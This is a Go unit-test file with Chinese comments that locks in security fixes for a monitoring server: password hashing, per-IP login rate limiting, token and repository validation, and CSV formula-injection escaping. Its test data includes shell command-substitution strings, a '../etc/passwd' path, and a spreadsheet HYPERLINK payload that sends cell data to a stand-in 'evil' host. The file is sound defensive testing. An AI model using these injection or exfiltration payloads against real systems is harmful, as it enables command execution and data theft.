package main

// ================= 安全相关单元测试 =================
//
// 这个项目此前没有任何测试。而下面这些函数有一个共同特点：
// 写错了不会编译失败、不会 panic，甚至在手工点几下界面时也看不出来 ——
// 登录限流、口令哈希、导出转义、上报限幅都属于这类「静默失效」。
// 所以它们的正确性必须由测试锁死，而不是靠 review 时多看一眼。

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/gin-gonic/gin"
	"golang.org/x/crypto/bcrypt"
)

// ================= 测试辅助 =================

func newTestCtx(remoteAddr string) *gin.Context {
	gin.SetMode(gin.TestMode)
	w := httptest.NewRecorder()
	c, _ := gin.CreateTestContext(w)
	c.Request = httptest.NewRequest("POST", "/login", nil)
	c.Request.RemoteAddr = remoteAddr
	return c
}

func resetLoginGuard() {
	loginGuard.Lock()
	loginGuard.m = make(map[string]*loginAttempt)
	loginGuard.Unlock()
}

// ================= 口令强度 =================

func TestPasswordWeakness(t *testing.T) {
	cases := []struct {
		name     string
		username string
		password string
		wantErr  bool
	}{
		{"太短", "admin", "Ab1!", true},
		{"只有一类字符", "admin", "abcdefghij", true},
		{"常见弱口令", "admin", "password1", true},
		{"与用户名相同", "admin", "admin123", true},
		{"大小写加数字", "admin", "Zx9Qw2Lm", false},
		{"含符号", "admin", "Zx9Qw2Lm!", false},
		{"刚好 8 位两类", "admin", "abcd1234", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := passwordWeakness(tc.username, tc.password)
			if (got != "") != tc.wantErr {
				t.Fatalf("passwordWeakness(%q, %q) = %q, wantErr=%v",
					tc.username, tc.password, got, tc.wantErr)
			}
		})
	}
}

// ================= 口令哈希 =================

func legacySHA256Hash(password string) string {
	salt := []byte("0123456789abcdef")
	sum := sha256.Sum256(append(salt, []byte(password)...))
	return hex.EncodeToString(salt) + "$" + hex.EncodeToString(sum[:])
}

// TestPasswordHashHandlesLongPasswords 锁死「超长口令不得降级」。
//
// bcrypt 的输入上限是 72 字节，超长会直接报错。原实现在报错时静默退回
// 单轮 SHA-256 —— 只要把密码设得足够长（passwordWeakness 允许到 128 字符），
// 拿到的就是一个抗爆破能力差了几个数量级的哈希，而界面上完全看不出来。
func TestPasswordHashHandlesLongPasswords(t *testing.T) {
	long := strings.Repeat("Zx9!", 30) // 120 字节
	if len(long) <= 72 {
		t.Fatalf("测试口令需要超过 72 字节，当前 %d", len(long))
	}

	h, err := hashPwd(long)
	if err != nil {
		t.Fatalf("hashPwd 返回错误: %v", err)
	}
	if !strings.HasPrefix(h, "$2") {
		t.Fatalf("超长口令没有走 bcrypt，实际哈希: %q", h)
	}
	if !checkPwd(long, h) {
		t.Fatal("超长口令校验失败")
	}
	if checkPwd(long+"x", h) {
		t.Fatal("错误口令通过了校验")
	}
}

// TestPasswordHashBackwardCompatible 锁死「改哈希方案不得锁死存量账号」。
//
// 新的 bcryptInput 对 ≤72 字节的口令仍然直接喂明文，因此旧库里
// bcrypt(raw) 的哈希必须继续可校验。这条一旦破了，升级后所有管理员
// 都登不进来，而且没有任何提示。
func TestPasswordHashBackwardCompatible(t *testing.T) {
	const pwd = "correct horse battery"

	// 旧代码的产物：bcrypt 直接吃明文
	oldStyle, err := bcrypt.GenerateFromPassword([]byte(pwd), bcrypt.MinCost)
	if err != nil {
		t.Fatalf("构造存量哈希失败: %v", err)
	}
	if !checkPwd(pwd, string(oldStyle)) {
		t.Fatal("存量 bcrypt 哈希无法校验 —— 升级后所有老账号都会被锁死")
	}

	// 更早的格式：salt$sha256，应可校验且被标记为需要升级
	legacy := legacySHA256Hash(pwd)
	if !checkPwd(pwd, legacy) {
		t.Fatal("旧 salt$sha256 哈希无法校验")
	}
	if _, needUpgrade := checkPwdUpgrade(pwd, legacy); !needUpgrade {
		t.Fatal("旧格式哈希应被标记为需要升级")
	}
	if checkPwd("wrong password", legacy) {
		t.Fatal("错误的旧格式口令通过了校验")
	}

	// 新生成的哈希不应被误判为需要升级
	fresh, err := hashPwd(pwd)
	if err != nil {
		t.Fatalf("hashPwd 失败: %v", err)
	}
	if _, needUpgrade := checkPwdUpgrade(pwd, fresh); needUpgrade {
		t.Fatal("bcrypt 哈希被误判为旧格式")
	}
}

func TestBcryptInputBoundary(t *testing.T) {
	// 72 字节是 bcrypt 的硬上限，边界两侧必须走不同分支且都能被校验
	exactly72 := strings.Repeat("a", 72)
	over72 := strings.Repeat("a", 73)

	if string(bcryptInput(exactly72)) != exactly72 {
		t.Fatal("72 字节口令应原样交给 bcrypt")
	}
	if string(bcryptInput(over72)) == over72 {
		t.Fatal("超过 72 字节的口令应先做 SHA-256 压缩")
	}
	// 压缩后固定为 64 个字符（sha256 的 hex 长度）
	if len(bcryptInput(over72)) != 64 {
		t.Fatalf("压缩后长度应为 64，实际 %d", len(bcryptInput(over72)))
	}

	h, err := hashPwd(over72)
	if err != nil {
		t.Fatalf("hashPwd(73 字节) 失败: %v", err)
	}
	if !checkPwd(over72, h) {
		t.Fatal("73 字节口令校验失败")
	}
}

// ================= 登录限流 =================

// TestLoginGuardLocksPerSourceIP 锁死「限流必须按来源 IP，且不牵连其它来源」。
//
// 如果按用户名锁定，攻击者不需要任何凭据，每 15 分钟发 5 次错误密码
// 就能让真正的管理员永远登不进来 —— 限流反而成了 DoS 工具。
func TestLoginGuardLocksPerSourceIP(t *testing.T) {
	resetLoginGuard()
	attacker := newTestCtx("203.0.113.9:40000")
	victim := newTestCtx("198.51.100.7:40000")

	for i := 0; i < loginMaxFails-1; i++ {
		if left := loginFailed(attacker, "admin"); left != loginMaxFails-i-1 {
			t.Fatalf("第 %d 次失败后剩余次数 = %d，期望 %d",
				i+1, left, loginMaxFails-i-1)
		}
	}
	if left := loginFailed(attacker, "admin"); left != 0 {
		t.Fatalf("第 %d 次失败应触发锁定（返回 0），实际 %d", loginMaxFails, left)
	}

	if _, blocked := loginBlocked(attacker); !blocked {
		t.Fatal("攻击来源应处于锁定中")
	}
	// 关键：另一个来源完全不受影响
	if _, blocked := loginBlocked(victim); blocked {
		t.Fatal("无关来源被牵连锁定了 —— 限流变成了 DoS 工具")
	}
	if left := loginFailed(victim, "admin"); left != loginMaxFails-1 {
		t.Fatalf("无关来源的计数被污染，剩余次数 = %d", left)
	}
}

// TestLoginGuardDoesNotSelfExtend 锁死「被限流的请求不得延长锁定窗口」。
//
// 原实现把限流判断放在密码校验之前，同时每次被拒又写一条失败记录 ——
// 计数窗口被一路往后推，锁定永不过期。攻击者 1 请求/分钟即可永久锁死。
func TestLoginGuardDoesNotSelfExtend(t *testing.T) {
	resetLoginGuard()
	ctx := newTestCtx("203.0.113.9:40000")

	for i := 0; i < loginMaxFails; i++ {
		loginFailed(ctx, "admin")
	}

	key := loginKey(ctx)
	loginGuard.Lock()
	lockedAt := loginGuard.m[key].lockedAt
	loginGuard.Unlock()
	if lockedAt.IsZero() {
		t.Fatal("应已进入锁定状态")
	}

	// 模拟攻击者持续探测：这些请求只会被 loginBlocked 挡下，
	// 不得再写入任何失败记录
	for i := 0; i < 20; i++ {
		if _, blocked := loginBlocked(ctx); !blocked {
			t.Fatal("应持续处于锁定中")
		}
	}

	loginGuard.Lock()
	after := loginGuard.m[key].lockedAt
	loginGuard.Unlock()
	if !after.Equal(lockedAt) {
		t.Fatalf("被限流的请求改动了锁定时间：%v -> %v", lockedAt, after)
	}
}

func TestLoginGuardSuccessClearsCounter(t *testing.T) {
	resetLoginGuard()
	ctx := newTestCtx("203.0.113.9:40000")

	loginFailed(ctx, "admin")
	loginFailed(ctx, "admin")
	loginSucceeded(ctx)

	loginGuard.Lock()
	_, exists := loginGuard.m[loginKey(ctx)]
	loginGuard.Unlock()
	if exists {
		t.Fatal("登录成功后应清空该来源的失败记录")
	}
}

func TestLoginGuardStaleCounterResets(t *testing.T) {
	resetLoginGuard()
	ctx := newTestCtx("203.0.113.9:40000")

	loginFailed(ctx, "admin")
	// 把首次失败时间往前拨，模拟「失败计数已过期」
	loginGuard.Lock()
	loginGuard.m[loginKey(ctx)].firstAt = time.Now().Add(-2 * loginFailSlack)
	loginGuard.Unlock()

	if left := loginFailed(ctx, "admin"); left != loginMaxFails-1 {
		t.Fatalf("过期计数应重新开始，剩余次数 = %d", left)
	}
}

// ================= 身份标识 =================

func TestValidToken(t *testing.T) {
	valid := []string{"abcdefgh", strings.Repeat("a", 64), "AbC-123_x"}
	for _, v := range valid {
		if !validToken(v) {
			t.Errorf("应接受 Token %q", v)
		}
	}
	// 这些都是「会被拼进 shell 命令 / systemd unit」的危险字符
	invalid := []string{
		"", "short", strings.Repeat("a", 65),
		"abc'defgh", `abc"defgh`, "abc;defgh", "abc defgh",
		"abc\ndefgh", "abc$(id)gh", "abc`id`fgh",
	}
	for _, v := range invalid {
		if validToken(v) {
			t.Errorf("应拒绝 Token %q", v)
		}
	}
}

func TestRandomAgentIDEntropy(t *testing.T) {
	seen := make(map[string]bool, 2000)
	for i := 0; i < 2000; i++ {
		id, err := randomAgentID()
		if err != nil {
			t.Fatalf("生成节点 ID 失败: %v", err)
		}
		// 8 字节 → 16 个十六进制字符。原实现只有 6 个字符，
		// 1000 个节点的生日碰撞概率就到 3%。
		if len(id) != 16 {
			t.Fatalf("节点 ID 长度应为 16，实际 %d（%q）", len(id), id)
		}
		if seen[id] {
			t.Fatalf("2000 次生成出现重复 ID: %q", id)
		}
		seen[id] = true
	}
}

// ================= 更新源校验 =================

func TestValidRepo(t *testing.T) {
	ok := []string{"jinhuaitao/Monitor", "a/b", "user.name/repo-name_1"}
	for _, v := range ok {
		if !validRepo(v) {
			t.Errorf("应接受仓库 %q", v)
		}
	}
	bad := []string{"", "noslash", "/repo", "owner/", "owner/re po",
		"https://github.com/a/b", "a/b/c", "../etc/passwd"}
	for _, v := range bad {
		if validRepo(v) {
			t.Errorf("应拒绝仓库 %q", v)
		}
	}
}

func TestValidProxy(t *testing.T) {
	if !validProxy("") {
		t.Error("空镜像应视为合法（表示直连）")
	}
	if !validProxy("https://ghfast.top/") {
		t.Error("https 镜像应被接受")
	}
	// 明文镜像会让整条更新链降级，等于把二进制交给中间人
	if validProxy("http://ghfast.top/") {
		t.Error("http 镜像必须被拒绝")
	}
	if validProxy("ftp://example.com/") || validProxy("not a url") {
		t.Error("非法地址必须被拒绝")
	}
}

// ================= CSV 公式注入 =================

func TestCsvSafe(t *testing.T) {
	// 这些前缀会被 Excel / WPS / Numbers 当公式求值
	for _, s := range []string{
		`=HYPERLINK("http://evil/?"&A1,"点我")`,
		"+1+1",
		"@SUM(1+1)",
		"\t=cmd",
		"\r=cmd",
		"-1+2", // 是公式而不是负数
	} {
		got := csvSafe(s)
		if !strings.HasPrefix(got, "'") {
			t.Errorf("应转义公式前缀: %q -> %q", s, got)
		}
	}

	// 负数必须放行，否则数值列的排序与求和会全部失效
	for _, s := range []string{"-5", "-3.14", "-0.5", "  -12  "} {
		if got := csvSafe(s); got != s {
			t.Errorf("负数不应被转义: %q -> %q", s, got)
		}
	}

	// 普通文本原样返回
	for _, s := range []string{"", "香港服务器-01", "8.8.8.8", "正常内容"} {
		if got := csvSafe(s); got != s {
			t.Errorf("普通文本被改动: %q -> %q", s, got)
		}
	}
}

// TestCsvSafeRowDoesNotMutateInput 锁死「逐字段转义必须复制而不是就地改」。
//
// 表头这类切片常常是包级共享的：就地修改会让它永久带上单引号，
// 之后每次导出都多一个 ' —— 第一次导出还是好的，第二次就坏了。
func TestCsvSafeRowDoesNotMutateInput(t *testing.T) {
	shared := []string{"时间", "=SUM(A1)"}
	original := append([]string(nil), shared...)

	out := csvSafeRow(shared)

	for i := range shared {
		if shared[i] != original[i] {
			t.Fatalf("入参被就地修改了：%v -> %v", original, shared)
		}
	}
	if !strings.HasPrefix(out[1], "'") {
		t.Fatalf("输出未转义公式: %v", out)
	}
}

// ================= 上报限幅 =================

func TestSanitizeReport(t *testing.T) {
	s := &SystemStatus{
		AgentID:   "abc\x00def",
		OS:        strings.Repeat("x", 200),
		MemTotal:  1 << 60, // 远超 1 PiB，应被置零
		DiskTotal: 1 << 60,
	}
	ping := make(map[string]int64, 200)
	for i := 0; i < 200; i++ {
		ping[fmt.Sprintf("target-%03d", i)] = 10
	}
	s.PingResults = ping

	sanitizeReport(s)

	if strings.ContainsRune(s.AgentID, 0) {
		t.Error("控制字符未被剔除")
	}
	if len([]rune(s.OS)) > 64 {
		t.Errorf("OS 字段未被截断，长度 %d", len([]rune(s.OS)))
	}
	if s.MemTotal != 0 || s.DiskTotal != 0 {
		t.Error("异常容量值未被置零")
	}
	// 不限条数时，一次心跳就能灌进上万个 ping 目标
	if len(s.PingResults) != maxPingTargetsPerReport {
		t.Errorf("ping 目标数未被限幅：%d，期望 %d",
			len(s.PingResults), maxPingTargetsPerReport)
	}
}

// TestSanitizeReportTruncatesPingKey 单独锁死「目标键名要被截断」。
// 键名会进数据库、进图表图例，不截断就等于让上报方决定我们的存储长度。
func TestSanitizeReportTruncatesPingKey(t *testing.T) {
	s := &SystemStatus{PingResults: map[string]int64{strings.Repeat("k", 300): 5}}
	sanitizeReport(s)

	if len(s.PingResults) != 1 {
		t.Fatalf("应保留 1 条，实际 %d", len(s.PingResults))
	}
	for k := range s.PingResults {
		if len([]rune(k)) != 128 {
			t.Fatalf("键名应被截断到 128，实际 %d", len([]rune(k)))
		}
	}
}

func TestCleanField(t *testing.T) {
	cases := []struct {
		in   string
		max  int
		want string
	}{
		{"  hello  ", 32, "hello"},
		{"a\x00b\x1fc", 32, "abc"},
		{"abcdef", 3, "abc"},
		{"中文测试", 2, "中文"},
	}
	for _, tc := range cases {
		if got := cleanField(tc.in, tc.max); got != tc.want {
			t.Errorf("cleanField(%q, %d) = %q, want %q", tc.in, tc.max, got, tc.want)
		}
	}
}

// ================= 架构归一化 =================

func TestNormalizeArch(t *testing.T) {
	cases := map[string]string{
		"x86_64": "amd64", "amd64": "amd64", "X64": "amd64",
		"aarch64": "arm64", "arm64": "arm64", "ARMv8": "arm64",
		"mips": "mips",
	}
	for in, want := range cases {
		if got := normalizeArch(in); got != want {
			t.Errorf("normalizeArch(%q) = %q, want %q", in, got, want)
		}
	}
}

// ================= 版本比对 =================

func TestHasUpdate(t *testing.T) {
	if hasUpdate("2026.09.30-abc", "2026.09.30-abc") {
		t.Error("同版本不应提示可更新")
	}
	if !hasUpdate("2026.09.29-abc", "2026.09.30-def") {
		t.Error("不同版本应提示可更新")
	}
	// dev 构建始终提示可更新，否则本地编译的版本永远升不了级
	if !hasUpdate("dev", "2026.09.30-abc") {
		t.Error("dev 版本应提示可更新")
	}
	if hasUpdate("dev", "") {
		t.Error("远端版本为空时不应提示可更新")
	}
}
